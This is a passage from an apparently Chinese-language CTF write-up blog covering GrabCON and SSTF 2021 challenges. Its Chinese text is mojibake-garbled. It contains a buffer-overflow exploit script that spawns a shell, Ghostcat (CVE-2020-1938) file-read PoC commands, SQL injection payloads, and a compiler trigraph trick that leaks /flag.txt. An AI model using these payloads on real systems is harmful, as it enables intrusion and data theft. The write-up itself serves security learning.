MGhMU1ZsV1ZWTXlWMDVPVTBaSFZUTXlTa3BHUmtzeU0wVkxWa2xXVFZWVFZVdFNTMWhKVkRKWFIwSk9SazFXVERKS1NrMUdSVTFETWt0T1RFVkxVbE5YUzA1WFJVMVZRMUpPVGxORlQxWkVNa3BHTlVaUFZreE1SMFpLVkVGWFUwOUxXVmxWTkZKVFZFZEdXVVZKVmxKUlRsSktSVEl5V2xaS05VdEhWMDVMUjB0V1RFWlZWa05YVGswMFZVZFZNMHhNU2taR1N6SXpXVXRLU2xkWFUxTk1TMGxaVjBkTlMxSkhSa3BGV1ZaTVRFcGFUVlpMVmxOUFNsSkxWRUUxUTFOTE5VdFdSVlpEVjB0V1NFWk5WVkpSU1ZWWlJrMHlNa2RMV2twWFZWWlRTa3RhUzBSQlQwdFJTMUZaUkZOVlExSklWVFpSUFQwOVBRPT0K
&lt;/code>&lt;/pre>&lt;p>ÂÖ®ÈÉ®ÊòØb64Âä†ÂØÜ ÂæàÁÆÄÂçï‰∫Ü&lt;/p>
&lt;p>&lt;code>GrabCON{dayuum_s0n!}&lt;/code>&lt;/p>
&lt;hr>
&lt;p>Â•ΩËèúÂ•ΩËèúÔºåÂºÄÂ≠¶‰∫Ü Â••ÈáåÁªô&lt;/p></description></item><item><title>SSCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/09/05/ssctf2021-wp/</link><pubDate>Sun, 05 Sep 2021 11:09:54 +0800</pubDate><guid>https://amiaaaz.github.io/2021/09/05/ssctf2021-wp/</guid><description>&lt;p>&lt;a href="https://research.samsung.com/sstf">https://research.samsung.com/sstf&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://playground.sstf.site/challenges">https://playground.sstf.site/challenges&lt;/a>&lt;/p>
&lt;h2 id="tutorialpractice-flag-submission">Tutorial/Practice: Flag Submission&lt;/h2>
&lt;p>&lt;code>SCTF{It_15_tim3_t0_hack!!}&lt;/code>&lt;/p>
&lt;h2 id="tutorialbof-101">Tutorial/BOF 101&lt;/h2>
&lt;p>&lt;a href="https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212261&amp;amp;authkey=%21AO4uYzudT40Rn_Y&amp;amp;em=2">https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212261&amp;amp;authkey=%21AO4uYzudT40Rn_Y&amp;amp;em=2&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210816204446737.png" alt="image-20210816204446737">&lt;/p>
&lt;p>&lt;code>SCTF{n0w_U_R_B0F_3xpEr7}&lt;/code>&lt;/p>
&lt;h2 id="tutorialbof-102">Tutorial/BOF 102&lt;/h2>
&lt;p>&lt;a href="https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212251&amp;amp;authkey=%21AMhDJ94NiXLWqYs&amp;amp;em=2">https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212251&amp;amp;authkey=%21AMhDJ94NiXLWqYs&amp;amp;em=2&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">telnetlib&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Telnet&lt;/span>
&lt;span style="color:#111">tn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Telnet&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;bof102.sstf.site&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">1337&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">tn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read_until&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;Name &amp;gt; &amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">tn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;/bin/sh&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">20&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\xe0\x83\x04\x08&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;C&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x34\xa0\x04\x08&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#111">tn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read_until&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34; &amp;gt; &amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">tn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">tn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">interact&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>SCTF{B0F_A774ck_w1Th_arg5_1n_x86}&lt;/code>&lt;/p>
&lt;h2 id="tutorialsqli-101">Tutorial/SQLi 101&lt;/h2>
&lt;p>&lt;a href="https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212257&amp;amp;authkey=%21ALtIE_cNe-XDn2o&amp;amp;em=2">https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212257&amp;amp;authkey=%21ALtIE_cNe-XDn2o&amp;amp;em=2&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210816201332616.png" alt="image-20210816201332616">&lt;/p>
&lt;p>&lt;code>SCTF{th3_f1rs7_5t3p_t0_the_w3B_h4ckEr}&lt;/code>&lt;/p>
&lt;h2 id="tutorialsqli102">Tutorial/SQLi102&lt;/h2>
&lt;p>&lt;a href="https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212260&amp;amp;authkey=%21AGPulJniPCbx8v4&amp;amp;em=2">https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212260&amp;amp;authkey=%21AGPulJniPCbx8v4&amp;amp;em=2&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">include&lt;/span> &lt;span style="color:#d88200">&amp;#34;./config.php&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$succ&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;showsrc&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">show_source&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;step1.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;searchkey&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$succ&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$query&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;select * from books where title like &amp;#39;%&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;searchkey&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;%&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">dbconnect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;sqli102_step3&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mysqli_query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$db&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$query&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">mysqli_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$db&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$rows&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mysqli_num_rows&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>SCTF{b451c_SQLi_5k1lls}&lt;/code>&lt;/p>
&lt;h2 id="tutorialrc-four">Tutorial/RC four&lt;/h2>
&lt;p>&lt;a href="https://www.geeksforgeeks.org/rc4-encryption-algorithm/">https://www.geeksforgeeks.org/rc4-encryption-algorithm/&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212253&amp;amp;authkey=%21AOekQp-wZMxDdfA&amp;amp;em=2">https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212253&amp;amp;authkey=%21AOekQp-wZMxDdfA&amp;amp;em=2&lt;/a>&lt;/p>
&lt;h2 id="tutorialrsa-101">Tutorial/RSA 101&lt;/h2>
&lt;p>&lt;a href="https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212256&amp;amp;authkey=%21ANLCkvPBdXSb8Ko&amp;amp;em=2">https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212256&amp;amp;authkey=%21ANLCkvPBdXSb8Ko&amp;amp;em=2&lt;/a>&lt;/p>
&lt;h2 id="websw-expert-academy">Web/SW Expert Academy&lt;/h2>
&lt;blockquote>
&lt;p>Are you poor at algorithm coding? Here is amazing platform to enhance your coding skill!&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210816213453433.png" alt="image-20210816213453433">&lt;/p>
&lt;p>Â•ΩÂÆ∂‰ºôÔºåÊ¢¶ÂõûÂ≠¶cËØ≠Ë®ÄÁöÑÊó∂ÂÄôÔºåÁúãÂà∞Ëøô‰∏™È™∞Â≠êÁöÑÊ¶ÇÁéáÂèàËÉΩÊ¢¶ÂõûÈ´ò‰∏âÊï∞Â≠¶ÁöÑÊ¶ÇÁéáÈÉ®ÂàÜ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210816233522899.png" alt="image-20210816233522899">&lt;/p>
&lt;p>‰ΩÜÊòØÊçèÔºåÂÆÉÂπ∂‰∏çÈúÄË¶Å‰Ω†ÂÖ∑‰ΩìÂÜôÂá∫Êù•codeÔºåÊ†áÁ≠îÂ∑≤ÁªèÁªôÂá∫ÔºàËôΩÁÑ∂ÊàëÊÜ®ÊÜ®ÁöÑ‰∏ÄÂºÄÂßãÊ≤°ÂèëÁé∞Ëá™Â∑±ËøòÂÜô‰∫Ü‰∏Ä‰ªΩÔºâ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">12&lt;/span>&lt;span style="color:#111">];&lt;/span>&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">12&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#111">scanf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;%d&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">ans&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">mod&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">36&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">j&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">j&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">12&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">j&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">j&lt;/span>&lt;span style="color:#111">])&lt;/span>&lt;span style="color:#111">ans&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">36&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#00a8c8">while&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ans&lt;/span>&lt;span style="color:#f92672">&amp;gt;=&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span>&lt;span style="color:#111">ans&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span>&lt;span style="color:#111">mod&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#111">ans&lt;/span>&lt;span style="color:#f92672">/=&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">mod&lt;/span>&lt;span style="color:#f92672">/=&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;%d/%d&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">ans&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">mod&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÂΩìÁÑ∂Áõ¥Êé•ËÆøÈóÆ/flag.txtÂèàÊòØ‰∏çÂèØ‰ª•ÁöÑ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210817001655162.png" alt="image-20210817001655162">&lt;/p>
&lt;p>ÈóÆÈ¢òÂ∞±ËΩ¨Âåñ‰∏∫‰∫ÜÂ¶Ç‰ΩïÂú®ËæìÂá∫‰∏∫Á¨¶ÂêàÊ†∑‰æãË¶ÅÊ±ÇÁöÑÊ†áÂáÜËæìÂá∫ÁöÑÊÉÖÂÜµ‰∏ãËøòËÉΩÊâìÂç∞‰∏Ä‰ªΩÂú∞ÂùÄÂ∑≤Áü•ÁöÑflag.txtÂá∫Êù•&lt;/p>
&lt;p>Áî±‰∫égccÊó¢ËÉΩÁºñËØëc‰πüÂèØ‰ª•ÁºñËØëc++ÔºåËøôÈáåÁî®importÊù•ÁªïËøáÂØπincludeÁöÑÈôêÂà∂ÔºõËÄåÂØπ‰∫é#ÁöÑÁªïËøáÂèØ‰ª•ÂèÇËßÅ-&amp;gt;&lt;a href="https://en.wikipedia.org/wiki/Digraphs_and_trigraphs">Digraphs and trigraphs&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c++" data-lang="c++">&lt;span style="color:#f92672">??=&lt;/span>&lt;span style="color:#111">import&lt;/span> &lt;span style="color:#d88200">&amp;#34;/flag.txt&amp;#34;&lt;/span>
&lt;span style="color:#f92672">%:&lt;/span>&lt;span style="color:#111">import&lt;/span> &lt;span style="color:#d88200">&amp;#34;/flag.txt&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Áõ∏ÂΩì‰∫é&lt;a href="https://en.wikipedia.org/wiki/Digraphs_and_trigraphs">#import &amp;ldquo;/flag.txt&amp;rdquo;&lt;/a>Ôºå‰ªégccÁºñËØëÊó∂ÁöÑÊä•Èîô‰ø°ÊÅØÂèØ‰ª•ÂæóÂà∞flag&lt;/p>
&lt;p>ÊàñËÄÖÁî®ÂèçÊñúÊù†+Êç¢Ë°åÁöÑÂΩ¢Âºè&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#f92672">??=&lt;/span>&lt;span style="color:#111">incl&lt;/span>\
&lt;span style="color:#111">ude&lt;/span> &lt;span style="color:#d88200">&amp;#34;/flag.txt&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>‰πüÂèØ‰ª•ÁªïËøáÂØπincludeÁöÑËøáÊª§&lt;/p>
&lt;p>&lt;code>SCTF{take-care-when-execute-unknown-code}&lt;/code>&lt;/p>
&lt;p>‚Äî‚Äî‚Äî‚ÄîÁ±ª‰ººÁöÑÈ¢ò‰πãÂâçÂÅöËøá‰∏Ä‰∏™&lt;a href="https://imagin.vip/?p=1063#CaaS">[FireshellCTF2020]Caas&lt;/a>Ôºå‰πüÊòØÈ¢ÑÂ§ÑÁêÜÈÅçÂéÜÊä•ÈîôÂá∫flag&lt;/p>
&lt;p>‚Äî‚Äî‚Äî‚ÄîÂú®Áúã‰∫Ü&lt;a href="https://zhuanlan.zhihu.com/p/401197671">Âà´ÁöÑÂ∏àÂÇÖÁöÑwp&lt;/a>‰πãÂêéÁúãÂà∞‰∫ÜÂè¶‰∏ÄÁßçËß£Ê≥ïÔºå‰ªéÊú™ËÆæÊÉ≥ËøáÁöÑÈÅìË∑Ø&lt;/p>
&lt;h2 id="webpoxe-center">Web/Poxe Center&lt;/h2>
&lt;blockquote>
&lt;p>how to get legendary poxemon?&lt;/p>
&lt;/blockquote>
&lt;p>Áúã‰∫Ü&lt;a href="https://github.com/theori-io/ctf/blob/master/2021/SSTF2021/SSTF%202021%20The%20Duck%20-%20Write%20Up%20-%20rev%201.pdf">wp&lt;/a>ÔºåÁõ¥Êé•sqlmap‰∏ÄÊääÊ¢≠&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210904145411586.png" alt="image-20210904145411586">&lt;/p>
&lt;p>‰∏çËøáÂÆòÊñπÁöÑÈ¢ÑÊúüËß£wpÊõ¥Â§çÊùÇ‰∏Ä‰∫õÔºö&lt;/p>
&lt;p>ÂÖàÁàÜÁõÆÂΩï/docs/&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210904152658881.png" alt="image-20210904152658881">&lt;/p>
&lt;p>Ëøô‰∏™ÁâàÊú¨‰∏ãÊúâ&lt;a href="https://www.chaitin.cn/zh/ghostcat">CVE-2020-1938 - Ghostcat&lt;/a>ÔºåÁõ∏ÂÖ≥ÊñáÁ´†ÂèÇËÄÉ-&amp;gt;&lt;a href="https://paper.seebug.org/1147/">‰∏çË∞ÉËØïÊ∫êÁ†ÅÈáçÁé∞ Ghostcat ÊºèÊ¥û (CVE-2020-1938)&lt;/a>&lt;/p>
&lt;p>‰ΩøÁî®&lt;a href="https://github.com/hypn0s/AJPy">ÂÖ¨ÂºÄÁöÑpoc&lt;/a>ËØª‰∏Ä‰∏ãÈÖçÁΩÆÊñá‰ª∂Ôºå‰πãÂêéÂ∞ÜclassÂèçÁºñËØëËé∑ÂæójavaÊ∫êÊñá‰ª∂ÔºàÂÆòÊñπpocÁ≤æÁÆÄ‰∫Ü‰∏Ä‰∫õÂÜÖÂÆπ ‰∏çËøáÂ§ßÂ∑Æ‰∏çÂ∑ÆÔºâ&lt;/p>
&lt;pre tabindex="0">&lt;code>python poc.py -p 31811 -f &amp;quot;/WEB-INF/web.xml&amp;quot; 127.0.0.1
python poc.py -p 31811 -f &amp;quot;/WEB-INF/classes/com/samsung/sctf/MainController.class&amp;quot; 127.0.0.1
python poc.py -p 31811 -f &amp;quot;/WEB-INF/classes/com/samsung/sctf/gochaMapper.class&amp;quot; 127.0.0.1
python poc.py -p 31811 -f &amp;quot;/WEB-INF/demo/WEB-INF/classes/mapper/gochaMapper.xml&amp;quot; 127.0.0.1
&lt;/code>&lt;/pre>&lt;p>/WEB-INF/classes/mapper/gochaMapper.xmlÊòØËøôÊ†∑ÁöÑ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210904163606221.png" alt="image-20210904163606221">&lt;/p>
&lt;p>ËøôÈáåÁöÑsortNameÂíåsortFlagÁõ¥Êé•ÊãºÊé•ËøõsqlËØ≠Âè•‰∏≠Ê≤°ÊúâËøáÊª§ÔºåÂ∞ùËØïsqli&lt;/p>
&lt;pre tabindex="0">&lt;code>sortName=(case%20when%20(select%20true)%20then%20BID%20else%20%270%27%20end)&amp;amp;sortFlag=desc
sortName=(case when (select true) then poke_name else '0' end)&amp;amp;sortFlag=asc
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>sortName=(case%20when%20(select%20false)%20then%20BID%20else%20%270%27%20end)&amp;amp;sortFlag=desc
sortName=(case when (select false) then poke_name else '0' end)&amp;amp;sortFlag=asc
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>sortName=random())dummy UNION SELECT'A','B','C','D','D','F',now(),'G','H','I' FROM(SELECT 1
sortFlag=NULL
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>sortName=random())dummy UNION SELECT DD.&amp;quot;index&amp;quot;,DD.&amp;quot;name&amp;quot;,DD.first_attribute,DD.second_attribute,'XX','XX',now(),'XX','XX','XX' FROM( SELECT * from poke_info
sortFlag=&amp;quot;&amp;quot;
&lt;/code>&lt;/pre>&lt;p>&lt;code>{G0tcH4_Gh0sT_c4t_iS_L3G3ND4Ry_P0k3}&lt;/code>&lt;/p>
&lt;h2 id="miscmelorean">Misc/meLorean&lt;/h2>
&lt;blockquote>
&lt;p>There was a crazy Data Scientist who rectilinearly claimed mathematics can make miracles.
He left a note and then disappeared. Help to decode it.&lt;/p>
&lt;/blockquote>
&lt;p>ÁªôÂá∫‰∫Ü‰∏Ä‰∏™ËøôÊ†∑ÁöÑÊñá‰ª∂ÔºåÂÖÖÊª°‰∫Ü‰∫åÁª¥ÂùêÊ†á&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210904143738246.png" alt="image-20210904143738246">&lt;/p>
&lt;p>‰∏Ä‰∏™Á∫øÊÄßÂõûÂΩíÁöÑÁõ∏ÂÖ≥ÈóÆÈ¢òÔºåÈúÄË¶ÅÁî®Âà∞python‰∏≠ÁöÑsklearn.linear_modelËøõË°åÊï∞ÊçÆÂ§ÑÁêÜ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ast&lt;/span>
